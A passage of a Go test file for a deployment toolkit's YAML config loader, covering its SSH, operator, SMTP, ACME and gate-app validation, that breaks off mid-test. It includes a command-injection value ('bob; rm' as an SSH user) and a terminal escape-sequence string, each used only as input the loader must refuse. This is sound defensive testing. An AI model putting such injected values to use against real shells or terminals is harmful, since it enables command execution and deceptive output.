package config_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/paisans-software/paisans-cli/internal/config"
)

func write(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "paisans-stack.yaml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

const minimal = `version: 1
id: f2a9c4e1-0b7d-4c3a-9e2f-5a6b7c8d9e01
community:
  name: "Fixture"
  domain: example.org
mesh:
  subnet: 10.44.0.0/24
operators:
  alice:
    name: Alice Example
    email: alice@example.org
    keys: |
      ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@example.org
sites:
  home-a:
    roles: [data, apps]
    address: 10.44.0.1
    ssh:
      host: home-a.local
      user: ubuntu
      keys: [alice]
etcd:
  members: [home-a]
apps:
  talk:
    blueprint: mbin
    hostname: talk.example.org
    placement: cluster
`

// validConfig is a minimal deployment that loads cleanly: a site holding
// data, apps and gateway, an address inside the mesh subnet, an ssh address,
// and the acme block a gateway requires.
const validConfig = `version: 1
id: f2a9c4e1-0b7d-4c3a-9e2f-5a6b7c8d9e01
community:
  name: "Fixture"
  domain: example.org
mesh:
  subnet: 10.44.0.0/24
acme:
  provider: desec
operators:
  alice:
    name: Alice Example
    email: alice@example.org
    keys: |
      ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@example.org
sites:
  home-a:
    roles: [data, apps, gateway]
    address: 10.44.0.1
    ssh:
      host: home-a.local
      user: ubuntu
      keys: [alice]
etcd:
  members: [home-a]
apps:
  talk:
    blueprint: mbin
    hostname: talk.example.org
    placement: cluster
`

func TestLoadsAMinimalFile(t *testing.T) {
	cfg, err := config.Load(write(t, minimal))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Apps["talk"].Placement.Mode != config.PlacementCluster {
		t.Fatalf("placement parsed as %q", cfg.Apps["talk"].Placement.Mode)
	}
	if !cfg.Sites["home-a"].Has(config.RoleData) {
		t.Fatal("the data role was not parsed")
	}
}

func TestPinnedPlacement(t *testing.T) {
	body := strings.Replace(minimal, "placement: cluster", "placement: { pinned: home-a }", 1)
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	placement := cfg.Apps["talk"].Placement
	if placement.Mode != config.PlacementPinned || placement.Site != "home-a" {
		t.Fatalf("pinned placement parsed as %+v", placement)
	}
}

// An unrecognised placement is carried through the decode rather than
// aborting it, so that validate can report it beside every other problem in
// the file.
func TestInvalidPlacementSurvivesTheDecode(t *testing.T) {
	body := strings.Replace(minimal, "placement: cluster", "placement: standby", 1)
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Apps["talk"].Placement.Mode != config.PlacementInvalid {
		t.Fatal("an invalid placement was not recorded as invalid")
	}
}

// Garage requires a unit suffix on the capacity it advertises to its layout,
// so an unset value has to become a usable one rather than an empty string
// that would break the first `layout assign`.
func TestGarageCapacityDefaultsTo100G(t *testing.T) {
	cfg, err := config.Load(write(t, minimal))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Storage.Garage.Capacity != "100G" {
		t.Fatalf("capacity defaulted to %q, want 100G", cfg.Storage.Garage.Capacity)
	}
}

// An explicit capacity is the operator's call, made because the toolkit
// cannot know how much of a node's disk is meant for objects, and the default
// must never override it.
func TestGarageCapacitySurvivesWhenDeclared(t *testing.T) {
	body := minimal + "storage:\n  garage:\n    capacity: 750G\n"
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Storage.Garage.Capacity != "750G" {
		t.Fatalf("capacity was %q, want the declared 750G", cfg.Storage.Garage.Capacity)
	}
}

// Every structural problem in a file is reported at once. Fixing a
// configuration one error per run is miserable.
func TestStructuralProblemsAreReportedTogether(t *testing.T) {
	body := `version: 2
community:
  name: "Fixture"
mesh:
  subnet: 10.44.0.5/24
sites:
  home-a:
    roles: [data, wizard]
    address: not-an-address
apps:
  talk:
    blueprint: Gopher
    hostname: ""
`
	_, err := config.Load(write(t, body))
	if err == nil {
		t.Fatal("a broken file loaded cleanly")
	}
	msg := err.Error()
	for _, want := range []string{
		"version:", "community.domain:", "mesh.subnet:", "sites.home-a.roles:", "sites.home-a.address:",
		"sites.home-a.ssh:", "apps.talk.blueprint:", "apps.talk.hostname:",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("the error does not name %s:\n%s", want, msg)
		}
	}
}

// Unknown keys are refused. trusted_proxies is deliberately not in the schema,
// and a typo that silently does nothing is worse than a refusal.
func TestUnknownKeysAreRefused(t *testing.T) {
	body := minimal + "trusted_proxies: 10.44.0.1\n"
	_, err := config.Load(write(t, body))
	if err == nil {
		t.Fatal("an unknown key was accepted")
	}
	if !strings.Contains(err.Error(), "trusted_proxies") {
		t.Fatalf("the error does not name the offending key:\n%v", err)
	}
}

// Certificates are a deployment wide fact rather than a gateway site's
// property, because the gateway role moves between machines by design. A
// deployment with a gateway and no provider cannot obtain a certificate, and
// that is a missing required field rather than a policy question.
func TestACMEProviderIsRequiredWhenAGatewayExists(t *testing.T) {
	path := filepath.Join(t.TempDir(), "paisans-stack.yaml")
	body := strings.Replace(validConfig, "acme:\n  provider: desec\n", "", 1)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := config.Load(path)
	if err == nil {
		t.Fatal("a deployment with a gateway and no acme provider loaded")
	}
	if !strings.Contains(err.Error(), "acme.provider") {
		t.Errorf("the error does not name the missing key:\n%v", err)
	}
}

// The provider is read as declared, and an override image is optional.
func TestACMEBlockLoads(t *testing.T) {
	path := filepath.Join(t.TempDir(), "paisans-stack.yaml")
	if err := os.WriteFile(path, []byte(validConfig), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.ACME.Provider != "desec" {
		t.Errorf("provider is %q, want desec", cfg.ACME.Provider)
	}
	if cfg.ACME.Image != "" {
		t.Errorf("image is %q, and the fixture declares none", cfg.ACME.Image)
	}
}

// The shipped example must load. It is the documentation of the format.
func TestExampleLoads(t *testing.T) {
	if _, err := config.Load(filepath.Join("..", "..", "examples", "paisans-stack.example.yaml")); err != nil {
		t.Fatal(err)
	}
}

// LoadBytes decodes as strictly as Load, from memory, and names no file.
func TestLoadBytesIsLoadWithoutAFile(t *testing.T) {
	cfg, err := config.LoadBytes([]byte(minimal))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Path != "" || cfg.Sites["home-a"].WatchdogMode() != config.WatchdogAuto {
		t.Fatalf("path %q, sites %v", cfg.Path, cfg.SiteNames())
	}
	if _, err := config.LoadBytes([]byte(minimal + "unknown_key: 1\n")); err == nil {
		t.Fatal("an unknown key was accepted")
	}
}

// A site that says nothing about its watchdog gets auto, which uses whatever
// device the host has. Making every operator write the default out would put a
// line in every site block that nobody reads.
func TestWatchdogDefaultsToAuto(t *testing.T) {
	cfg, err := config.Load(write(t, minimal))
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Sites["home-a"].WatchdogMode(); got != config.WatchdogAuto {
		t.Fatalf("an undeclared watchdog is %q, want auto", got)
	}
}

// A misspelt mode is refused at load rather than read as auto, because auto
// on a host with no device loads a module the operator may have meant to
// rule out.
func TestUnknownWatchdogModeIsRefused(t *testing.T) {
	body := strings.Replace(minimal, "    address: 10.44.0.1\n", "    address: 10.44.0.1\n    watchdog: hardware\n", 1)
	_, err := config.Load(write(t, body))
	if err == nil || !strings.Contains(err.Error(), "sites.home-a.watchdog") {
		t.Fatalf("an unknown watchdog mode loaded: %v", err)
	}
	for _, mode := range []string{"auto", "required", "softdog", "off"} {
		body := strings.Replace(minimal, "    address: 10.44.0.1\n", "    address: 10.44.0.1\n    watchdog: "+mode+"\n", 1)
		if _, err := config.Load(write(t, body)); err != nil {
			t.Errorf("watchdog %s was refused: %v", mode, err)
		}
	}
}

// Obviously fake keys: ed25519 keys of all zero, all one and all two bytes.
const (
	fakeKeyA = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@example.org"
	fakeKeyB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB bob@example.org"
	fakeKeyC = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC alice@laptop"
)

// withSSH replaces minimal's ssh section with the given one, indented as a
// site key.
func withSSH(section string) string {
	start := strings.Index(minimal, "    ssh:\n")
	end := strings.Index(minimal, "etcd:\n")
	return minimal[:start] + section + minimal[end:]
}

func loadErr(t *testing.T, body string) string {
	t.Helper()
	_, err := config.Load(write(t, body))
	if err == nil {
		return ""
	}
	return err.Error()
}

// withAdmin replaces minimal's operators section with the given one, which may be
// empty to leave the section out.
func withAdmin(body, section string) string {
	start := strings.Index(body, "operators:\n")
	end := strings.Index(body, "sites:\n")
	return body[:start] + section + body[end:]
}

// A site's ssh.keys names admins, and the keys it authorises are theirs,
// merged in the order the site lists them.
func TestSSHSectionLoads(t *testing.T) {
	admins := "operators:\n  alice:\n    name: Alice Example\n    email: alice@example.org\n    keys: |\n      " + fakeKeyA + "\n\n      " + fakeKeyC + "\n  bob:\n    name: Bob Example\n    email: bob@example.org\n    keys: |\n      " + fakeKeyB + "\n"
	body := withAdmin(withSSH("    ssh:\n      host: 203.0.113.10\n      user: ubuntu\n      port: 2222\n      keys: [bob, alice]\n"), admins)
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	site := cfg.Sites["home-a"]
	if site.SSHHost() != "203.0.113.10" || site.SSH.User != "ubuntu" || site.SSH.PortOrDefault() != 2222 {
		t.Fatalf("section read as %+v", site.SSH)
	}
	if a := cfg.Operators["alice"]; a.Name != "Alice Example" || a.Email != "alice@example.org" {
		t.Errorf("admin alice read as %+v", a)
	}
	keys, problems := site.SSH.AuthorizedKeys()
	if len(problems) > 0 || len(keys) != 3 {
		t.Fatalf("keys %v, problems %v", keys, problems)
	}
	if keys[0].Line != fakeKeyB || keys[0].Name != "bob" {
		t.Errorf("first key read as %+v, want bob's", keys[0])
	}
	if keys[1].Line != fakeKeyA || keys[1].Name != "alice" || keys[1].Comment != "alice@example.org" || !strings.HasPrefix(keys[1].Fingerprint, "SHA256:") {
		t.Errorf("second key read as %+v", keys[1])
	}
	if keys[2].Line != fakeKeyC || keys[2].Name != "alice" {
		t.Errorf("third key read as %+v, want alice's second", keys[2])
	}
}

// ssh.user may be left out, or written empty: the site is then reached as
// the deployment's own user, paisans-<token>. The default is not written
// into ssh.user, so the file's own value stays apart from it.
func TestSSHUserDefaultsToTheDeploymentsOwnUser(t *testing.T) {
	for name, section := range map[string]string{
		"left out":      "    ssh:\n      host: home-a.local\n      keys: [alice]\n",
		"written empty": "    ssh:\n      host: home-a.local\n      user: \"\"\n      keys: [alice]\n",
		"written as ~":  "    ssh:\n      host: home-a.local\n      user: ~\n      keys: [alice]\n",
	} {
		t.Run(name, func(t *testing.T) {
			cfg, err := config.Load(write(t, withSSH(section)))
			if err != nil {
				t.Fatal(err)
			}
			site := cfg.Sites["home-a"]
			if site.SSH.User != "" {
				t.Errorf("ssh.user read as %q, want it empty", site.SSH.User)
			}
			if got := site.SSHUser(); got != "paisans-f2a9" {
				t.Errorf("user is %q, want paisans-f2a9", got)
			}
			if got := site.Destination().String(); got != "paisans-f2a9@home-a.local:22" {
				t.Errorf("destination is %q, want paisans-f2a9@home-a.local:22", got)
			}
		})
	}
}

// A declared ssh.user is the user the site is reached as.
func TestSSHUserIsTheDeclaredName(t *testing.T) {
	cfg, err := config.Load(write(t, minimal))
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Sites["home-a"].SSHUser(); got != "ubuntu" {
		t.Errorf("user is %q, want ubuntu", got)
	}
}

// A site that leaves ssh.user out names the file it was loaded from, where a
// command records the user it logged in as. A site naming its user names
// none, and so does one loaded from bytes or built by hand, which have no
// file to record it in.
func TestSSHUserFileIsWhereTheDefaultUserIsRecorded(t *testing.T) {
	path := write(t, withSSH("    ssh:\n      host: home-a.local\n      keys: [alice]\n"))
	cfg, err := config.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Sites["home-a"].SSHUserFile(); got != path {
		t.Errorf("SSHUserFile() = %q, want %q", got, path)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	fromBytes, err := config.LoadBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if got := fromBytes.Sites["home-a"].SSHUserFile(); got != "" {
		t.Errorf("loaded from bytes: SSHUserFile() = %q, want none", got)
	}
	declared, err := config.Load(write(t, minimal))
	if err != nil {
		t.Fatal(err)
	}
	if got := declared.Sites["home-a"].SSHUserFile(); got != "" {
		t.Errorf("a declared user: SSHUserFile() = %q, want none", got)
	}
	if got := (config.Site{}).SSHUserFile(); got != "" {
		t.Errorf("a site built by hand: SSHUserFile() = %q, want none", got)
	}
}

// Each site gets only the keys of the admins it names.
func TestSSHKeysAreOnlyTheListedAdmins(t *testing.T) {
	admins := "operators:\n  alice:\n    name: Alice Example\n    email: alice@example.org\n    keys: |\n      " + fakeKeyA + "\n  bob:\n    name: Bob Example\n    email: bob@example.org\n    keys: |\n      " + fakeKeyB + "\n"
	cfg, err := config.Load(write(t, withAdmin(minimal, admins)))
	if err != nil {
		t.Fatal(err)
	}
	keys, _ := cfg.Sites["home-a"].SSH.AuthorizedKeys()
	if len(keys) != 1 || keys[0].Name != "alice" {
		t.Errorf("home-a authorises %+v, want alice's key alone", keys)
	}
}

func TestSSHDefaultsPortAndHost(t *testing.T) {
	body := withSSH("    public_address: 203.0.113.20\n    ssh:\n      user: ubuntu\n      keys: [alice]\n")
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	site := cfg.Sites["home-a"]
	if site.SSHHost() != "203.0.113.20" {
		t.Errorf("host defaulted to %q, want the public address", site.SSHHost())
	}
	if site.SSH.PortOrDefault() != 22 {
		t.Errorf("port defaulted to %d, want 22", site.SSH.PortOrDefault())
	}
}

// With neither ssh.host nor public_address, the host is the endpoint's host,
// the address the other sites already reach this one on.
func TestSSHHostFallsBackToTheEndpoint(t *testing.T) {
	body := withSSH("    endpoint: 203.0.113.30:51820\n    ssh:\n      user: ubuntu\n      keys: [alice]\n")
	cfg, err := config.Load(write(t, body))
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.Sites["home-a"].SSHHost(); got != "203.0.113.30" {
		t.Errorf("host defaulted to %q, want the endpoint's host", got)
	}
}

// public_address comes before the endpoint, and ssh.host before both.
func TestSSHHostPrefersHostThenPublicAddress(t *testing.T) {
	key := "      keys: [alice]\n"
	cases := []struct{ name, section, want string }{
		{"public address", "    endpoint: 203.0.113.30:51820\n    public_address: 203.0.113.20\n    ssh:\n      user: ubuntu\n" + key, "203.0.113.20"},
		{"host", "    endpoint: 203.0.113.30:51820\n    public_address: 203.0.113.20\n    ssh:\n      host: home-a.local\n      user: ubuntu\n" + key, "home-a.local"},
		{"IPv6 endpoint", "    endpoint: \"[2001:db8::1]:51820\"\n    ssh:\n      user: ubuntu\n" + key, "2001:db8::1"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cfg, err := config.Load(write(t, withSSH(c.section)))
			if err != nil {
				t.Fatal(err)
			}
			if got := cfg.Sites["home-a"].SSHHost(); got != c.want {
				t.Errorf("host is %q, want %q", got, c.want)
			}
		})
	}
}

// A string where the section belongs is refused.
func TestSSHStringIsRefused(t *testing.T) {
	msg := loadErr(t, withSSH("    ssh: ubuntu@home-a.local\n"))
	if !strings.Contains(msg, "ssh must be a section") {
		t.Errorf("refusal does not say ssh must be a section:\n%s", msg)
	}
}

func TestSSHSectionRefusals(t *testing.T) {
	key := "      keys: [alice]\n"
	cases := []struct {
		name, section, want string
	}{
		{"missing", "", "sites.home-a.ssh: required"},
		{"bad user", "    ssh:\n      host: home-a.local\n      user: \"bob; rm\"\n" + key, "is not a user name"},
		{"port too high", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      port: 70000\n" + key, "ssh.port: 70000 is not a port"},
		{"negative port", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      port: -1\n" + key, "ssh.port: -1 is not a port"},
		{"no host, public address or endpoint", "    ssh:\n      user: ubuntu\n" + key, "ssh.host: required, because the site has neither public_address nor endpoint"},
		{"user in host", "    ssh:\n      host: ubuntu@home-a.local\n      user: ubuntu\n" + key, "neither a hostname nor an IP address"},
		{"no key", "    ssh:\n      host: home-a.local\n      user: ubuntu\n", "ssh.keys: required"},
		{"empty keys", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      keys: []\n", "ssh.keys: required"},
		{"keys a mapping", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      keys:\n        alice: " + fakeKeyA + "\n", "ssh.keys must list the operators who may log in"},
		{"unknown admin", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      keys: [alice, carol]\n", "sites.home-a.ssh.keys: carol is not in the operators section"},
		{"admin twice", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      keys: [alice, alice]\n", "sites.home-a.ssh.keys: alice is listed twice"},
		{"public_key", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      public_key: |\n        " + fakeKeyA + "\n", "field public_key not found"},
		{"unknown key", "    ssh:\n      host: home-a.local\n      user: ubuntu\n      public_keys: " + fakeKeyA + "\n", "field public_keys not found"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			msg := loadErr(t, withSSH(c.section))
			if !strings.Contains(msg, c.want) {
				t.Errorf("want %q in the refusal, got:\n%s", c.want, msg)
			}
		})
	}
}

func TestOperatorSectionRefusals(t *testing.T) {
	admin := func(id, body string) string {
		return "operators:\n  " + id + ":\n" + body
	}
	keyed := func(lines ...string) string {
		return "    keys: |\n      " + strings.Join(lines, "\n      ") + "\n"
	}
	cases := []struct {
		name, section, want string
	}{
		{"missing", "", "sites.home-a.ssh.keys: alice is not in the operators section"},
		{"no email", admin("alice", keyed(fakeKeyA)), "operators.alice.email: required"},
		{"no name", admin("alice", "    email: alice@example.org\n"+keyed(fakeKeyA)), "operators.alice.name: required. Give the operator's first and last name, Eg: name: Alice Example."},
		{"one word name", admin("alice", "    name: Alice\n    email: alice@example.org\n"+keyed(fakeKeyA)), "operators.alice.name: \"Alice\" is not a first and a last name"},
		{"blank last name", admin("alice", "    name: \"Alice  \"\n    email: alice@example.org\n"+keyed(fakeKeyA)), "operators.alice.name: \"Alice  \" is not a first and a last name"},
		{"not an email", admin("alice", "    email: Alice <alice@example.org>\n"+keyed(fakeKeyA)), "operators.alice.email: \"Alice <alice@example.org>\" is not an email address alone"},
		{"no keys", admin("alice", "    email: alice@example.org\n"), "operators.alice.keys: required"},
		{"not a key", admin("alice", "    email: alice@example.org\n"+keyed("ssh-ed25519 not-base64")), "operators.alice.keys: line 1 is not an OpenSSH public key"},
		{"private key path", admin("alice", "    email: alice@example.org\n"+keyed("~/.ssh/id_ed25519")), "not an OpenSSH public key"},
		{"options", admin("alice", "    email: alice@example.org\n"+keyed("from=\"203.0.113.0/24\" "+fakeKeyA)), "operators.alice.keys: line 1 carries options"},
		{"key twice", admin("alice", "    email: alice@example.org\n"+keyed(fakeKeyA, strings.Replace(fakeKeyA, "alice@example.org", "alice@laptop", 1))), "operators.alice.keys: line 2 is a key the operator already lists"},
		{"key shared", admin("alice", "    email: alice@example.org\n"+keyed(fakeKeyA)) + "  bob:\n    email: bob@example.org\n" + keyed(fakeKeyA), "operators.bob.keys: line 1 is operators.alice's key too"},
		{"bad name", "operators:\n  \"Alice Smith\":\n    email: alice@example.org\n" + keyed(fakeKeyB) + admin("alice", "    email: alice@example.org\n"+keyed(fakeKeyA))[len("operators:\n"):], "operators.Alice Smith: not a name this toolkit accepts"},
		{"unknown field", admin("alice", "    email: alice@example.org\n    public_keys: x\n"+keyed(fakeKeyA)), "field public_keys not found"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			msg := loadErr(t, withAdmin(minimal, c.section))
			if !strings.Contains(msg, c.want) {
				t.Errorf("want %q in the refusal, got:\n%s", c.want, msg)
			}
		})
	}
}

func TestSSHHostAcceptsHostnamesAndAddresses(t *testing.T) {
	for _, host := range []string{"home-a.local", "vm.example.org", "203.0.113.10", "2001:db8::10", "home-a"} {
		body := withSSH("    ssh:\n      host: \"" + host + "\"\n      user: ubuntu\n      keys: [alice]\n")
		if msg := loadErr(t, body); msg != "" {
			t.Errorf("host %s refused: %s", host, msg)
		}
	}
}

const smtpBlock = `smtp:
  host: smtp.example.org
  port: 587
  security: starttls
  username: robot@example.org
  from_address: hello@example.org
  from_name: Fixture
`

// healthApp is an uptime app pinned to site, appended to validConfig's apps.
func healthApp(site, extra string) string {
	return "  health:\n    blueprint: uptime\n    hostname: health.example.org\n    placement: { pinned: " + site + " }\n" + extra
}

// An app's smtp block replaces only the fields it names; everything else is
// the deployment's, so a different sender does not mean repeating the host.
func TestSMTPForInheritsAndOverridesFieldByField(t *testing.T) {
	cfg, err := config.Load(write(t, validConfig+healthApp("home-a", "    smtp:\n      from_address: alerts@example.org\n      security: tls\n")+smtpBlock))
	if err != nil {
		t.Fatal(err)
	}
	got := cfg.SMTPFor("health")
	want := config.SMTP{Host: "smtp.example.org", Port: 587, Security: "tls", Username: "robot@example.org", FromAddress: "alerts@example.org", FromName: "Fixture"}
	if got != want {
		t.Fatalf("got %+v, want %+v", got, want)
	}
	if cfg.SMTPFor("talk") != cfg.SMTP {
		t.Fatal("an app without an override did not get the deployment's block")
	}
}

func TestSMTPPortDefaultsBySecurity(t *testing.T) {
	if p := (config.SMTP{Security: "starttls"}).PortOrDefault(); p != 587 {
		t.Fatalf("starttls: %d", p)
	}
	if p := (config.SMTP{Security: "tls"}).PortOrDefault(); p != 465 {
		t.Fatalf("tls: %d", p)
	}
	if p := (config.SMTP{Security: "tls", Port: 2465}).PortOrDefault(); p != 2465 {
		t.Fatalf("declared: %d", p)
	}
}

func TestSMTPShapeIsChecked(t *testing.T) {
	body := validConfig + healthApp("home-a", "    smtp:\n      security: ssl\n") + "smtp:\n  host: smtp.example.org\n  security: none\n  port: 70000\n"
	_, err := config.Load(write(t, body))
	if err == nil {
		t.Fatal("loaded")
	}
	for _, want := range []string{"smtp.security", "smtp.port", "apps.health.smtp.security"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("no problem named %s in %v", want, err)
		}
	}
}

// A site may declare no roles only when an app is pinned to it: then it
// exists to host that app. With nothing pinned it is almost certainly a
// mistake.
func TestARolelessSiteIsAcceptedOnlyWhenSomethingIsPinnedToIt(t *testing.T) {
	site := "  mon:\n    roles: []\n    address: 10.44.0.9\n    ssh:\n      host: mon.local\n      user: ubuntu\n      keys: [alice]\n"
	withSite := strings.Replace(validConfig, "etcd:\n", site+"etcd:\n", 1)
	if _, err := config.Load(write(t, withSite)); err == nil || !strings.Contains(err.Error(), "sites.mon.roles") {
		t.Fatalf("a role-less site with nothing pinned to it loaded: %v", err)
	}
	if _, err := config.Load(write(t, withSite+healthApp("mon", ""))); err != nil {
		t.Fatalf("a role-less site hosting a pinned app was refused: %v", err)
	}
}

// monitorSite is validConfig with a watch site holding the monitor role and
// extra appended to its entry, before the uptime app is pinned there.
func monitorSite(extra string) string {
	site := "  watch:\n    roles: [monitor]\n    address: 10.44.0.9\n    public_address: 203.0.113.20\n    ssh:\n      host: watch.local\n      user: ubuntu\n      keys: [alice]\n" + extra
	return strings.Replace(validConfig, "etcd:\n", site+"etcd:\n", 1) + healthApp("watch", "")
}

func TestAMonitorSiteLoadsWithWebServer(t *testing.T) {
	cfg, err := config.Load(write(t, monitorSite("    web_server:\n      managed_by: external\n      listen: 127.0.0.1:8480\n")))
	if err != nil {
		t.Fatal(err)
	}
	watch := cfg.Sites["watch"]
	if !watch.Has(config.RoleMonitor) || watch.WebServerManagedBy() != config.ManagedByExternal {
		t.Fatalf("watch: %+v", watch)
	}
	host, port, ok := watch.WebServer.ListenHostPort()
	if !ok || host != "127.0.0.1" || port != 8480 {
		t.Fatalf("listen: %s %d %v", host, port, ok)
	}
	if watch.RunsCaddy() {
		t.Fatal("an external monitor runs no Caddy")
	}
	if got := cfg.MonitorSites(); len(got) != 1 || got[0] != "watch" {
		t.Fatalf("monitor sites: %v", got)
	}
}

func TestWebServerManagedByDefaultsToPaisansAndRunsCaddy(t *testing.T) {
	// No web_server block, and a block that leaves managed_by out, are both
	// managed_by paisans.
	for _, block := range []string{"", "    web_server:\n      include_dir: false\n"} {
		cfg, err := config.Load(write(t, monitorSite(block)))
		if err != nil {
			t.Fatal(err)
		}
		if got := cfg.Sites["watch"].WebServerManagedBy(); got != config.ManagedByPaisans || !cfg.Sites["watch"].RunsCaddy() {
			t.Fatalf("%q: managed_by %s, caddy %v", block, got, cfg.Sites["watch"].RunsCaddy())
		}
	}
	cfg, err := config.Load(write(t, monitorSite("")))
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Sites["home-a"].RunsCaddy() {
		t.Fatal("the gateway runs no Caddy")
	}
}

func TestWebServerShapeIsChecked(t *testing.T) {
	for _, tc := range []struct{ webServer, want string }{
		{"    web_server:\n      managed_by: nginx\n", "sites.watch.web_server.managed_by: unknown value"},
		{"    web_server:\n      managed_by: external\n      listen: localhost:8480\n", "sites.watch.web_server.listen"},
		{"    web_server:\n      managed_by: external\n      listen: 127.0.0.1:0\n", "sites.watch.web_server.listen"},
		{"    web_server:\n      managed_by: external\n      listen: 127.0.0.1\n", "sites.watch.web_server.listen"},
		{"    web_server:\n      proxy: nginx\n", "field proxy not found"},
	} {
		if msg := loadErr(t, monitorSite(tc.webServer)); !strings.Contains(msg, tc.want) {
			t.Errorf("%q: %s", tc.webServer, msg)
		}
	}
}

// acme.provider names the module the toolkit's Caddy answers DNS-01 with, so
// it is required wherever that Caddy runs: a gateway, or a monitor serving
// its own apps. A monitor behind the operator's web server runs none.
func TestACMEProviderIsRequiredForAMonitorsOwnCaddy(t *testing.T) {
	strip := func(body string) string {
		body = strings.Replace(body, "acme:\n  provider: desec\n", "", 1)
		return strings.Replace(body, "roles: [data, apps, gateway]", "roles: [data, apps]", 1)
	}
	if msg := loadErr(t, strip(monitorSite(""))); !strings.Contains(msg, "acme.provider: required") {
		t.Fatalf("paisans mode: %s", msg)
	}
	if _, err := config.Load(write(t, strip(monitorSite("    web_server:\n      managed_by: external\n      listen: 127.0.0.1:8480\n")))); err != nil {
		t.Fatalf("external mode needs no provider: %v", err)
	}
}

// An app setting gated or auto_login brings in the gate: one oauth2-proxy app,
// which no file declares, at gate.<domain> and pinned to the gateway. Neither
// key set, no gate.
func TestTheGateIsDerivedWhenAnAppUsesIt(t *testing.T) {
	cfg, err := config.Load(write(t, validConfig))
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := cfg.Apps[config.GateApp]; ok || cfg.NeedsGate() {
		t.Error("no app sets gated or auto_login, yet the gate is derived")
	}
	for _, key := range []string{"gated", "auto_login"} {
		cfg, err := config.Load(write(t, validConfig+"    "+key+": true\n"))
		if err != nil {
			t.Fatalf("%s: true did not load: %v", key, err)
		}
		gate, ok := cfg.Apps[config.GateApp]
		if !ok {
			t.Fatalf("%s: true derived no gate", key)
		}
		want := config.App{
			Blueprint: config.BlueprintOAuth2Proxy,
			Hostname:  "gate.example.org",
			Placement: config.Placement{Mode: config.PlacementPinned, Site: "home-a"},
			Derived:   true,
		}
		if gate.Blueprint != want.Blueprint || gate.Hostname != want.Hostname || gate.Placement != want.Placement || !gate.Derived {
			t.Errorf("%s: true derived %+v, want %+v", key, gate, want)
		}
	}
}

// The gate is the toolkit's: a declared oauth2-proxy app is refused, and so is
// an app holding the gate's name, or no gateway to run it on.
func TestTheGateIsNeverDeclared(t *testing.T) {
	declared := validConfig + `  gate:
    blueprint: oauth2-proxy
    hostname: gate.example.org
    placement: { pinned: home-a }
`
	if _, err := config.Load(write(t, declared)); err == nil || !strings.Contains(err.Error(), "apps.gate.blueprint: oauth2-proxy is the gate") {
		t.Errorf("a declared oauth2-proxy app loaded, or was refused without saying why: %v", err)
	}
	named := validConfig + `    gated: true
  gate:
    blueprint: wikijs
    hostname: wiki.example.org
    placement: cluster
`
	if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "the name is the gate's") {
		t.Errorf("an app named gate loaded beside a gated app: %v", err)
	}
	if _, err := config.Load(write(t, minimal+"    gated: true\n")); err == nil || !strings.Contains(err.Error(), "no site holds the gateway role") {
		t.Errorf("a gated app loaded with no gateway: %v", err)
	}
}

// The keys this replaced are not read. A deployment is redeployed with the new
// keys rather than converted, and an old file fails loudly instead of loading
// with its gate silently dropped.
func TestTheOldGateKeysAreRefused(t *testing.T) {
	for _, old := range []string{"gate: members", "visibility_gate: member"} {
		_, err := config.Load(write(t, minimal+"    "+old+"\n"))
		if err == nil {
			t.Fatalf("an app with %q loaded, and would render ungated", old)
		}
		if !strings.Contains(err.Error(), strings.SplitN(old, ":", 2)[0]) {
			t.Fatalf("the error does not name the key:\n%v", err)
		}
	}
}

// A control character in what the review prints is refused
// where it is written, naming the field: a terminal reads ESC and its kin as
// commands, so a key comment carrying one could redraw the review's lines.
func TestControlCharactersAreRefused(t *testing.T) {
	esc := `\e[1A\e[2K~ key`
	alice := func(name, email, keys string) string {
